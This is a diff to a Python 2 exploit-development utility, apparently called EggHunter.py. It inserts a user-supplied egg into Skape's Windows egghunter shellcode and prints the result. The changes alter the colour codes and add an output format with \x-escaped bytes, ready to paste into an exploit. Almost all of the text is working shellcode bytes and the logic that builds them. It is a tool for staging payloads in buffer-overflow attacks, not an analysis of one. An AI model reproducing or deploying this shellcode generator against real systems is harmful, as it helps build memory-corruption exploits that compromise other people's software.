@@ -6,9 +6,9 @@ import sys
 
 # colors (*NIX systems only)
 W = '\033[0m'  # white
-R = '\033[31m' # red
+R = '\033[91m' # Light Red
 G = '\033[32m' # green
-O = '\033[33m' # orange
+M = '\033[95m' # Light magenta
 
 # the script takes user supplied egg as input and plug it to Skape's piece of art! the output (opcode) is debugger and binary file friendly.
 # Reference: "Safely Searching Process Virtual Address Space" skape 2004 http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
@@ -32,13 +32,16 @@ O = '\033[33m' # orange
 if len(sys.argv) < 2:
 		print "Usage: python EggHunter.py <"+G+"egg"+W+">"
 		sys.exit(0)
-	
-Input  = str(sys.argv[1])
-Egg    = binascii.hexlify(Input)
-Egg    = list(Egg)
-OpCode = Egg[6]+Egg[7]+Egg[4]+Egg[5]+Egg[2]+Egg[3]+Egg[0]+Egg[1]
-Opcode = "6681caff0f42526a0258cd2e3c055a74efb8" +O+ OpCode +W+ "8bfaaf75eaaf75e7ffe7"
 
-print "["+G+"+"+W+"] Egg Hunter shellcode with egg of '"+O+Input+W+"'.."
+Input          = str(sys.argv[1])
+Egg            = binascii.hexlify(Input)
+Egg            = list(Egg)
+OpCode         = Egg[6]+Egg[7]+Egg[4]+Egg[5]+Egg[2]+Egg[3]+Egg[0]+Egg[1]
+Shellcode      = "\\x"+Egg[6]+Egg[7]+"\\x"+Egg[4]+Egg[5]+"\\x"+Egg[2]+Egg[3]+"\\x"+Egg[0]+Egg[1]
+FinalOpcode    = "6681caff0f42526a0258cd2e3c055a74efb8" +M+ OpCode +W+ "8bfaaf75eaaf75e7ffe7"
+FinalShellcode = "'\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8" +M+ Shellcode +W+ "\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7'"
+
+print "["+G+"+"+W+"] Egg Hunter shellcode with egg of '"+M+Input+W+"'.."
 time.sleep(1)
-print Opcode
+print R+"Final Opcode    "+W+": " + FinalOpcode
+print R+"Final Shellcode "+W+": " + FinalShellcode
